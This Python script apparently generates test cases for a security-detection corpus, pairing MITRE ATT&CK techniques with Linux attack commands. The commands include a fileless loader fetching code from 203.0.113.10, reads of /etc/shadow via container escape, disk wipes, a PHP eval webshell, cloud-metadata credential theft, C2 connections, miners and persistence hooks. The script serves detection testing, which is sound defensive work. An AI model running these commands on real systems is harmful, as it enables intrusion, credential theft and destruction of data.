#!/usr/bin/env python
# -*- coding: ascii -*-
"""Standalone wave-3 variant generator (docs/09 path A, third rotation).

Wave 3 rotates verb x target-family shapes for the thinnest classes in
the corpus (the 10-13 case classes and the r2 vocab-expansion classes).
Every entry must differ from existing corpus cmds at the verb level or
the target-family level, never as a pure parameter swap. Output is
interleaved round-robin across classes so same-class cases are never
adjacent in execution order. Independent from gen_variants.py (wave 1)
and gen_wave2.py (wave 2).

Usage: gen_wave3.py corpus/qinjing.yaml --output proposals/wave3-r1.yaml
"""
import argparse, os, re, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from parse import parse_corpus, cmd_hygiene_errors

# (tactic, technique, [(cmd, impact, mode, bin[, cleanup]), ...])
W3 = {
 "container_escape": ("TA0004", "T1611", [
  ("docker run --rm --cap-add=SYS_ADMIN alpine mount -t ext4 /dev/sdb1 /tmp/qinjing-hostdisk",
   "destructive", "sim-missing-bin", "docker"),
  ("docker run --rm -v /dev:/hostdev busybox ls -l /hostdev/",
   "destructive", "sim-missing-bin", "docker"),
  ("podman run --privileged -v /:/host alpine cat /host/etc/shadow",
   "destructive", "sim-missing-bin", "podman"),
 ]),
 "disk_wipe": ("TA0040", "T1561.001", [
  ("blkdiscard /dev/sdc", "destructive", "sim-missing-bin", "blkdiscard"),
  ("nvme format /dev/nvme0n1", "destructive", "sim-missing-bin", "nvme"),
  ("parted /dev/sdd --script mklabel gpt", "destructive", "sim-missing-bin",
   "parted"),
 ]),
 "fileless_execution": ("TA0005", "T1620", [
  ("python -c 'import os,socket,shutil; s=socket.create_connection((\"203.0.113.10\",8080)); fd=os.memfd_create(\"qj-netfd\"); shutil.copyfileobj(s.makefile(\"rb\"), os.fdopen(fd,\"wb\")); os.fchmod(fd,493); os.execv(\"/proc/self/fd/%d\"%fd,[\"qj-netfd\"])'",
   "none", "real", "python"),
  ("python3 -c \"import ctypes,os; libc=ctypes.CDLL(None); fd=libc.memfd_create(b'qj-eat',0); os.write(fd, open('/bin/true','rb').read()); libc.syscall(322, fd, b'', None, None, 4096)\"",
   "none", "sim-missing-bin", "python3"),
 ]),
 "valid_account_remote_login": ("TA0001", "T1078", [
  ("mysql -h 203.0.113.17 -u root -pQjPw2 -e 'SELECT 1;'",
   "none", "sim-missing-bin", "mysql"),
  ("redis-cli -h 203.0.113.18 -a QjRedis1 INFO server",
   "none", "sim-missing-bin", "redis-cli"),
  ("curl -u deploy:QjFtp1 ftp://203.0.113.19/",
   "none", "real", "curl"),
 ]),
 "c2_socket_script": ("TA0011", "T1095", [
  ("socat - TCP:203.0.113.9:4444", "none", "sim-missing-bin", "socat"),
  ("openssl s_client -connect 203.0.113.9:8443 -quiet </dev/null",
   "none", "sim-missing-bin", "openssl"),
  ("telnet 203.0.113.9 5555", "none", "sim-missing-bin", "telnet"),
 ]),
 "cloud_metadata_access": ("TA0006", "T1552.005", [
  ("wget --header='Metadata-Flavor: Google' -q -O - http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
   "none", "sim-missing-bin", "wget"),
  ("curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
   "none", "real", "curl"),
 ]),
 "dns_tunneling": ("TA0011", "T1071.004", [
  ("printf '[dns2tcp]\\nserver = tun.example.com\\nresource = qjshell\\n' > /tmp/qinjing-d2t.conf && dns2tcp -d -f /tmp/qinjing-d2t.conf",
   "temporary", "sim-missing-bin", "dns2tcp",
   "rm -f /tmp/qinjing-d2t.conf"),
 ]),
 "ebpf_load": ("TA0004", "T1547.006", [
  ("execsnoop-bpfcc", "none", "sim-missing-bin", "execsnoop-bpfcc"),
  ("opensnoop-bpfcc -T", "none", "sim-missing-bin", "opensnoop-bpfcc"),
 ]),
 "kernel_module_load": ("TA0004", "T1547.006", [
  ("dkms build -m qjdrv2 -v 2.0 && dkms install -m qjdrv2 -v 2.0",
   "destructive", "sim-missing-bin", "dkms"),
 ]),
 "lateral_ssh_tunnel": ("TA0008", "T1572", [
  ("ssh -o ControlMaster=auto -o ControlPath=/tmp/qinjing-cm-%r@%h:%p -o ControlPersist=10m -N -L 5432:203.0.113.17:5432 benchuser@203.0.113.15",
   "none", "real", "ssh"),
 ]),
 "persistence_boot_script": ("TA0003", "T1037.004", [
  ("echo 'setsid /tmp/qinjing-beacon &' >> /etc/init.d/after.local",
   "destructive", "sim-builtin", "-"),
  ("printf 'start on started network-services\\nexec /tmp/qinjing-beacon\\n' > /etc/init/qinjing.conf",
   "destructive", "sim-builtin", "-"),
 ]),
 "tor_connection": ("TA0011", "T1090.003", [
  ("tor-resolve check.example.com 127.0.0.1:9050",
   "none", "sim-missing-bin", "tor-resolve"),
 ]),
 "tunnel_tool_use": ("TA0011", "T1071.001", [
  ("tailscale up --authkey tsctl-qinjing-test",
   "none", "sim-missing-bin", "tailscale"),
  ("zerotier-cli join 93af6d1e21c3a2b4",
   "none", "sim-missing-bin", "zerotier-cli"),
  ("rathole -c /tmp/qinjing-rathole.toml",
   "none", "sim-missing-bin", "rathole"),
 ]),
 "webshell_write": ("TA0003", "T1505.003", [
  ("sed -i '1i <?php @eval($_POST[c]); ?>' /var/www/html/index.php",
   "destructive", "real", "sed"),
  ("base64 -d /tmp/qinjing-ws.b64 > /var/www/html/qj-b64.php",
   "destructive", "real", "base64"),
  ("install -m 0644 /tmp/qinjing-shell.aspx /var/www/html/shell.aspx",
   "destructive", "real", "install"),
 ]),
 "cryptomining": ("TA0040", "T1496", [
  ("cpuminer -a sha256d -o stratum+tcp://pool4.example.net:3333 -u qj",
   "temporary", "sim-missing-bin", "cpuminer"),
  ("cgminer -o stratum+tcp://pool6.example.org:3333 -u qj.1 -p x",
   "temporary", "sim-missing-bin", "cgminer"),
  ("nohup /tmp/qinjing-miner -o pool.example.com:3333 >/dev/null 2>&1 &",
   "temporary", "real", "nohup"),
 ]),
 "git_hook_persistence": ("TA0003", "T1546", [
  ("git init /tmp/qinjing-gitrepo13 && echo id > /tmp/qinjing-gitrepo13/.git/hooks/post-checkout && chmod +x /tmp/qinjing-gitrepo13/.git/hooks/post-checkout && git -C /tmp/qinjing-gitrepo13 checkout -b qj-w3a",
   "temporary", "real", "git",
   "rm -f /tmp/qinjing-gitrepo13/.git/hooks/post-checkout"),
  ("git init /tmp/qinjing-gitrepo14 && echo id > /tmp/qinjing-gitrepo14/.git/hooks/commit-msg && chmod +x /tmp/qinjing-gitrepo14/.git/hooks/commit-msg && git -C /tmp/qinjing-gitrepo14 commit --allow-empty -m qj14",
   "temporary", "real", "git",
   "rm -f /tmp/qinjing-gitrepo14/.git/hooks/commit-msg"),
  ("git init --bare /tmp/qinjing-remote15 && git init /tmp/qinjing-gitrepo15 && echo id > /tmp/qinjing-gitrepo15/.git/hooks/pre-push && chmod +x /tmp/qinjing-gitrepo15/.git/hooks/pre-push && git -C /tmp/qinjing-gitrepo15 push /tmp/qinjing-remote15 HEAD",
   "temporary", "real", "git",
   "rm -f /tmp/qinjing-gitrepo15/.git/hooks/pre-push"),
 ]),
 "linker_hijack": ("TA0002", "T1574.006", [
  ("patchelf --set-rpath /tmp/qinjing-rpath /usr/local/bin/qinjing-hosttool",
   "destructive", "sim-missing-bin", "patchelf"),
  ("gcc -shared -fPIC -o /usr/local/lib/libresolv.so.2 /tmp/qinjing-src2.c && ldconfig",
   "destructive", "sim-missing-bin", "gcc"),
 ]),
 "persistence_pam": ("TA0003", "T1556.003", [
  ("pam-auth-update --enable qinjing-module",
   "destructive", "sim-missing-bin", "pam-auth-update"),
 ]),
 "setuid_discovery": ("TA0004", "T1548.001", [
  ("for b in /usr/bin/sudo /bin/su /usr/bin/passwd /bin/mount; do [ -u $b ] && echo SUID:$b; done",
   "none", "sim-builtin", "-"),
  ("ls -la /usr/sbin | grep -E '^-..[sS]'",
   "none", "real", "ls"),
 ]),
 "systemd_timer_persistence": ("TA0003", "T1053.006", [
  ("systemd-run --on-active=15m --unit=qj-transient /tmp/qinjing-beacon",
   "temporary", "real", "systemd-run"),
 ]),
 "timestomp": ("TA0005", "T1070.006", [
  ("touch -h -t 200102030405 /tmp/qinjing-ts-w3b",
   "temporary", "real", "touch", "rm -f /tmp/qinjing-ts-w3b"),
  ("debugfs -w -R 'set_inode_field /etc/shadow mtime 946684800' /dev/sda1",
   "destructive", "sim-missing-bin", "debugfs"),
 ]),
 "root_cert_install": ("TA0112", "T1553.004", [
  ("update-ca-trust extract", "destructive", "sim-missing-bin",
   "update-ca-trust"),
  ("certutil -A -n qj-ca-w3 -t 'C,,' -i /tmp/qinjing-ca13.crt -d /etc/pki/nssdb",
   "destructive", "sim-missing-bin", "certutil"),
 ]),
 "defense_service_stop": ("TA0112", "T1685.007", [
  ("systemctl kill --signal=SIGKILL clamav-daemon",
   "destructive", "real", "systemctl"),
  ("chkconfig auditd off", "destructive", "real", "chkconfig"),
 ]),
 "account_discovery": ("TA0007", "T1033", [
  ("awk -F: '{print $1}' /etc/passwd | wc -l", "none", "real", "awk"),
  ("compgen -u", "none", "sim-builtin", "-"),
 ]),
 "k8s_pod_exec": ("TA0002", "T1609", [
  ("kubectl debug node/qj-w3-node -it --image=busybox",
   "none", "sim-missing-bin", "kubectl"),
  ("docker exec qj-w3ctr /bin/sh -c 'cat /etc/shadow'",
   "none", "sim-missing-bin", "docker"),
 ]),
}

# Class rotation order for the interleave (thinnest classes first so the
# round-robin head is the sparsest signal families).
W3_ORDER = [
    "container_escape", "disk_wipe", "fileless_execution",
    "valid_account_remote_login", "c2_socket_script", "cloud_metadata_access",
    "dns_tunneling", "ebpf_load", "kernel_module_load", "lateral_ssh_tunnel",
    "persistence_boot_script", "tor_connection", "tunnel_tool_use",
    "webshell_write", "cryptomining", "git_hook_persistence", "linker_hijack",
    "persistence_pam", "setuid_discovery", "systemd_timer_persistence",
    "timestomp", "root_cert_install", "defense_service_stop",
    "account_discovery", "k8s_pod_exec",
]


def esc(t):
    return t.replace("'", "''")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("corpus")
    ap.add_argument("--output", required=True)
    args = ap.parse_args()
    cases = parse_corpus(args.corpus)
    existing = set()
    for sec in ("false_positives", "attacks"):
        for c in cases[sec]:
            existing.add(c.get("cmd", ""))
    seq = 0
    for c in cases["attacks"]:
        m = re.match(r"VR(\d+)", c.get("id", ""))
        if m:
            seq = max(seq, int(m.group(1)))
    per_class = {}
    dupes = 0
    hygiene_rej = 0
    for cls in W3_ORDER:
        tactic, technique, entries = W3[cls]
        bucket = per_class.setdefault(cls, [])
        n = 0
        for entry in entries:
            cmd, impact, mode, bin_name = entry[0], entry[1], entry[2], entry[3]
            cleanup = entry[4] if len(entry) > 4 else None
            if cmd in existing:
                dupes += 1
                print("DUPLICATE [%s]: %s" % (cls, cmd[:60]))
                continue
            probs = cmd_hygiene_errors(cmd, impact)
            if probs:
                hygiene_rej += 1
                print("REJECT [%s]: %s -> %s" % (cls, cmd[:60], probs[0]))
                continue
            seq += 1
            n += 1
            bucket.append((seq, cls, tactic, technique, cmd, impact, mode,
                           bin_name, cleanup))
    # Execution order is file order; round-robin so same-class cases are
    # never adjacent (lesson from the r2 merge round). Count before the
    # pop loop drains the per-class buckets.
    total = sum(len(v) for v in per_class.values())
    ordered = []
    queues = [per_class[c] for c in W3_ORDER if per_class.get(c)]
    while any(queues):
        for queue in queues:
            if queue:
                ordered.append(queue.pop(0))
    lines = ["# Wave-3 variants (tools/gen_wave3.py)", ""]
    lines.append("attacks:")
    for s, cls, tac, tech, cmd, imp, mode, bin_, cleanup in ordered:
        lines.append("  - id: VR%03d" % s)
        lines.append("    tactic: %s" % tac)
        lines.append("    technique: %s" % tech)
        lines.append("    name: %s variant w3-%d" % (cls, s))
        lines.append("    platforms: [linux]")
        lines.append("    cmd: '%s'" % esc(cmd))
        lines.append("    bin: '%s'" % bin_)
        lines.append("    creates_process: %s"
                     % ("true" if mode != "sim-builtin" else "false"))
        lines.append("    mode: %s" % mode)
        lines.append("    expected_signals: [%s]" % cls)
        lines.append("    related_signals: []")
        lines.append("    expect: detectable")
        lines.append("    impact: %s" % imp)
        if cleanup:
            lines.append("    cleanup: %s" % cleanup)
    with open(args.output, "w", encoding="ascii", newline="\n") as fh:
        fh.write("\n".join(lines) + "\n")
    print("generated %d (%d dupes, %d hygiene rejects) -> %s"
          % (total, dupes, hygiene_rej, args.output))


if __name__ == "__main__":
    sys.exit(main())
